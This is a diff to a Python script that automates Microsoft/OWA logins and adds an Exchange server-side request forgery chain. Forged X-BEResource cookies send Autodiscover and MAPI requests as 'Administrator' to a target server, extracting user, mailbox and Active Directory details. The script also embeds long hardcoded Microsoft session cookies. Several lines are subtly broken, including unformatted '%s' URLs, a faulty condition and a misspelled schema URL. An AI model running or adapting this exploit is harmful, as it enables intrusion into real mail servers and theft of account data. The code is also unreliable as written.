@@ -80,6 +80,7 @@ def client_Id():
 
 username = sys.argv[1]
 domainName = username.split('@')[1]
+target = sys.argv[2]
 
 while True:
     fT = flowToken()
@@ -95,7 +96,7 @@ while True:
     cookie = 'brcap=0; ESTSAUTHPERSISTENT=%s; ch=UiZoFzWECLWKnbVHRYcjwLcdWLVpUNbgKRuvPXNJ9OE; MSFPC=GUID=7a50db6543fc43df9a8812b47f5ba092&HASH=7a50&LV=202104&V=4&LU=1617718897604; buid=0.AQgAnoxqczZLxU6KmmD3k_9H8_fhvoluXopNnz3s1gElnacIAP4.AQABAAEAAAD--DLA3VO7QrddgJg7WevrUTUavQR6t9LLSPramdNFCS06CTE9tf7gsbOHr9nVuKusep8IYtCpKabKBiZ5OTsiV-0KvF2CGSB-OUvJOCvz6gUz2HhxeT6ES93bI1LSzlGp-oDGBQtkgxX81nX9RO4mh9CGyW7shzRmf_hMmJKHL22A2PjifVZQNp2MI2D-iGQgAA; fpc=AkfbZsCDxDVNnqHotEM6aVGerOTJAQAAANcXgtkOAAAA; clrc=%s; wlidperf=FR=L&ST=1643042676978; CCState=Q29nQkNpQmtaV0p5WVhOb1pYSTRNVGswUUhOMGRXUmxiblJ6TG5WaGNIUmpMbVZrZFJJQkFTSUpDWUFrSDMrNm90bElNaW9LRWdvUUFnQUFBQUFBOFEvT0FBQUFBQUFBQUJJSkNWR2VYeE1nNGRsSUdna0pPczhGUjhYZTJVZzRBRWdBVWhJS0VKNk1hbk0yUzhWT2lwcGc5NVAvUi9OYUVnb1FINEhMbks3WUUwYStZeWdQcjkwc0pCSVNDaENOWnFVc3doNjJSSmtqN1ZVSnJsK1NHZ2tKT3M4RlI4WGUyVWdpZWdFQUFRQUJBQUFBL3ZneXdOMVR1MEszWFlDWU8xbnI2eDR3eTRzZlEwbWhCTW9MQlV0TWNuZXpTNmNGS2xHQ1VGMVF4RFNTSE1TeSs2cld2M1ViOWo2Vnd4c2xoQkNFMmhNZ08xTlRIcU1lU0Qva3JoRGwvYms0V3U1WGFhQnhmekxYU3hYdlBLWmhlcUx3dlpMNnJ2UHo2Tk8xeGdRYjFpQUFLb0FHQVFBQkFBRUFBQURmWUVUc1RUWGp6MEhzTFh3RFlRSVBNSUlCNGdZSktvWklodmNOQVFjRG9JSUIwekNDQWM4Q0FRQXhnZ0Y3TUlJQmR3SUJBREJmTUVzeEN6QUpCZ05WQkFZVEFsVlRNUlV3RXdZRFZRUUtFd3hFYVdkcFEyVnlkQ0JKYm1NeEpUQWpCZ05WQkFNVEhFUnBaMmxEWlhKMElFTnNiM1ZrSUZObGNuWnBZMlZ6SUVOQkxURUNFQWR1bzgyZklEQ2cxcGNYV2hyNmp3UXdEUVlKS29aSWh2Y05BUUVCQlFBRWdnRUFjRVRKY1NMSU43MDRzNTNQNDlyVlNnUE9uTzlscmRYNUJ6aDFaQ2VBSnRQTkJVNzc0Z1lrTy9ScVdDVWhaWUQ3b2huZmZMeEprVG9sSjZ4M3ltSEsvKzRvdTBIMU11LzFXUlpLcVJRVytTUGRxeEdiT25LbUtHM0RMTThzL2VsQmpCSy9hTDdGa3BDU1BHOStkaDVOdHdwV1RubER4YjdwU2NBRHpRWVBDOVdRVVF5ajBBcTVhWTZ6bHpQL3czMVVubWJRanhRK2pZa3g4cFhDUWxJOU9CSGt3TnZEazBvb25ZaXVtQ2R0Z1dZOEd1N0Jia3ljNFRtbjlOeWcxS2lEOGtaTU9tekxia3dzWHFxeWtrelJtTnNNN0dCK3FKK3RVRHBET3paSVQ0OTNGMXpxME5ncHovWk91ZVRtc2YvUVBWYmFCZ29QR282cHN3S2kyK0YwZXpCTEJna3Foa2lHOXcwQkJ3RXdGQVlJS29aSWh2Y05Bd2NFQ0M1RUhERmJOZWZhZ0Nqa3p2VWJpOHJvL1ZHZUNxaDNDcWhaVnYvRGFzb3h5WW02TlJqdmtFdlRtY001SVRqRVFFdGFlbG5mSXEwZUwwTUlHRFVTZlRCTGFjckJURUhlT2ljczEyWTNDSFlkQkxCSWszaU9RMU1CQTZiWU1uVlJYUUNGdFl4VnJDLytQMFBBTmF2VDcxLzBxNnlJamJSY1dmQm9UbHJSZDl5ZHM3cmQ2NWJyWm4zSFhVV0hrbnNaQmJ4V2FsTVlpc2Z0M0ZBMzdSdHR3NVVDcmRSSjZ3dzc3dXdiT3pPZFpyeE1za1F2VnNRTVY3R3RFZUk2ZTNTY0N5dTJCMEFPNFA4SGhDbVV5bThDSnpkcExGSUlsazE1V1VYZEVrWWp3dzM3bEdNVDQ1b3ZqMXQ4YlJXZjR4UHpMTkFKaVYvTFFvc3EzMmhNczJKZVJlRVJERGFhOTFNNUlESHRleUF5Y3ZlNVVWMGk4RFhnVEY3RGpBL0hjN2ErYjU3QUZ1RFFJY29SWlM0TlpZMlNvbWlmM3dBQg==; ESTSAUTH=0.AQgAnoxqczZLxU6KmmD3k_9H8_fhvoluXopNnz3s1gElnacIAP4.AgABAAQAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P-ZwXnVopFt5Iqvgq3n6MShVKJi-aQsDBI7f6jL35wt958rGx-X0EGtC_EkSZBMC5QfHoFyIcmz9A; ESTSAUTHLIGHT=+; ESTSSC=00; esctx=AQABAAAAAAD--DLA3VO7QrddgJg7WevrFjIuQb4miTDwgVfQNxLCzZZ4OP6aPlUZF4oxt8alTWgGq__mScD05ntY1li2kLMT1Gf2mG1Vc9v59rXOWec2-NpsnDLhXuWmTvC2vS4jKIqAMkg3Uy_v5MT03Wo56JLfe9CWEFuZYqixGv-NJNPCFPl_-zmNVRndb3ol4xpC6rQgAA; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd' % (enc_code, clrc)
 
     #Encode Referer Link
-    redirect_uri= urlencode.quote('https://outlook.office.com/owa/')
+    redirect_uri= urlencode.quote('https://%s/owa/' % target)
     claims = '''{"id_token":{"xms_cc":{"values":["CP1"]}}}'''
     claims_enc = urlencode.quote(claims)
     referer = 'https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=%s&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=f41fe8c6-802c-1350-9b59-8ffbda187bfe&protectedtoken=true&claims=%s&nonce=637787237990811037.6dc37c42-c79b-44fd-87ec-3bab7a7067fc&state=DcsxEoAgDAXRoONxIoEwfDgOBGktvb4p3nYbiOh0hwviIVQFGrKid2kpieKuyxRWMhv65FL24obHWOeYGJCKbcHfK77fiD8' % (redirect_uri, claims_enc)
@@ -144,7 +145,7 @@ while True:
             'Connection': 'close'
             }
 
-    rp = requests.post('https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US', headers=headers,
+    rp = requests.post('https://%s/owa/common/GetCredentialType?mkt=en-US', headers=headers,
                                                                                                data=json,
                                                                                                timeout=10,
                                                                                                verify=True)
@@ -215,7 +216,7 @@ while True:
                 'Connection': 'close'
             }
 
-    rp = requests.post('https://login.microsoftonline.com/common/login', headers=headers, 
+    rp = requests.post('https://%s/owa/auth/logon.aspx', headers=headers, 
                                                                          data=data, 
                                                                          timeout=10, 
                                                                          verify=True)
@@ -243,8 +244,8 @@ while True:
     
     redirect_uri = 'https://webshell.suite.office.com/iframe/TokenFactoryIframe'
     enc_redirect_uri = urlencode.quote(redirect_uri)
-    #scope = b'https://webshell.suite.office.com/.default openid profile offline_access'
-    #enc_scope = urlencode.quote_from_bytes(scope)
+    scope = b'https://webshell.suite.office.com/.default openid profile offline_access'
+    enc_scope = urlencode.quote_from_bytes(scope)
 
     data = '''
     client_id=%s\
@@ -280,10 +281,10 @@ while True:
             'Te': 'trailers',
             'Connections': 'close'}
     
-    rp = requests.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token', headers=headers,
-                                                                                            data=data, 
-                                                                                            timeout=2, 
-                                                                                            verify=True)
+    rp = requests.post('https://%s/oauth2/v2.0/token' % target, headers=headers,
+                                                                data=data, 
+                                                                timeout=2, 
+                                                                verify=True)
 
     #page = BeautifulSoup(rp.content, 'html.parser')
     if b'error' in rp.content:
@@ -363,7 +364,7 @@ while True:
 
     try:
         #Send Request
-        rp = requests.post('https://outlook.office.com/owa/service.svc?action=GetSearchableMailboxes&app=Mail&n=31', data=json,
+        rp = requests.post('https://%s/owa/service.svc?action=GetSearchableMailboxes&app=Mail&n=31' % target, data=json,
                                                                                                                     headers=headers,
                                                                                                                     timeout=10,
                                                                                                                     verify=True)
@@ -383,6 +384,78 @@ while True:
             pass
 
         time.sleep(3)
+
+        if 'X-Calculatedbetarget' in rp.headers and 'X-Feserver' in rp.headers:
+            FQDN = rp.headers['X-Feserver']
+
+        autoDiscovery = '''
+            <xml version="1.0" encoding="utf-8"?>
+            <soap:Envelope xmlns:a="https://schemas.microsoft.com/exchange/2010/Autodiscover"
+                           xmlns:b="https://schemas.microsoft.com/exchange/services/2006/messages"
+                           xmlns:wsa="http://www.w3.org/2005/08/addressing"
+                           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                           xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+                <soap:Header>
+                <a:RequestedServerVersion>Exchange2010</a:RequestedServerVersion>
+                <wsa:Action>https://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetUserSettings</wsa.Action>
+                <wsa:To>
+                    https://%s/autodiscover/autodiscover.svc
+                </wsa:To>
+            </soap:Header>
+            <soap:Body>
+                <a:GetUserSettingsRequestMessage xmlns:a="https://schemas.micorosoft.com/exchange/2010/Autodiscover">
+                    <a:Request>
+                        <a:Users>
+                            <a:User>
+                                <a:Mailbox>%s</a:Mailbox>
+                            </a:User>
+                        </a:Users>
+                        <a:RequestedSettings>
+                            <a:Setting>UserDisplayName</a:Setting>
+                            <a:Setting>UserDN</a:Setting>
+                            <a:Setting>UserDeploymentId</a:Setting>
+                            <a:Setting>InternalMailboxServer</a:Setting>
+                            <a:Setting>MailboxDN</a:Setting>
+                            <a:Setting>ActiveDirectoryServer</a:Setting>
+                            <a:Setting>CasVersion</a:Setting>
+                            <a:Setting>EwsSupportedSchemas</a:Setting>
+                        </a:RequestedSettings>
+                    </a:Request>
+                </a:GetUserSettingsRequestMessage>
+            </soap:Body>
+        ''' % (target, username)
+
+        headers = {'Cookie': 'X-BeResource=https://%s:587/autodiscover/autodiscover.xml?a=~1942062522' % FQDN,
+                   'Content-Type': 'text/xml',
+                   'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'}
+
+        rp = requests.post('https://%s/owa/service.svc' % target, headers=headers,
+                                                                                data=autoDiscovery,
+                                                                                verify=True)
+
+        if rp.status_code != 200:
+            print(rp.status_code)
+            print("Autodiscover Error!")
+            exit()
+        if "<UserDN>" and "<MailboxDN>" and "<ActiveDirectoryServer>" not in str(rp.content):
+            print('Cannot get UserDN, MailboxDN, or ActiveDirectoryServer')
+            exit()
+        
+        userDn = str(rp.content).split("<UserDN>")[1].split(r'</UserDN>')[0]
+        mailboxDn = str(rp.content).split('<MailboxDN>')[1].split(r'</MailboxDN>')[0]
+        activeDirectoryServer = str(rp.content).split('<ActiveDirectoryServer>')[1].split(r'</ActiveDirectoryServer>')[0]
+        
+        mapi_body = userDn+'@'+mailboxDn+'\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00'
+
+        headers = {'Cookie': 'X-BEResource=ldap://Administrator@%s:636/mapi/emsmdb?MailboxId=%s@%s&a=~1942062522' % (FQDN, userDn, mailboxDn),
+        'Content-Type': 'application/mapi-http',
+        'X-RequestType': 'Connect',
+        'X-Clientinfo': '{'+str(uuid.uuid4())+'}',
+        'X-RequestId': '{'+str(uuid.uuid4())+'}',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'}
+
+        rp = requests.post('https://%s/owa/service.svc' % target,headers=headers, data=mapi_body, verify=True, timeout=10)
+        
 
     #Handle Exceptions
     except requests.ConnectionError as e:
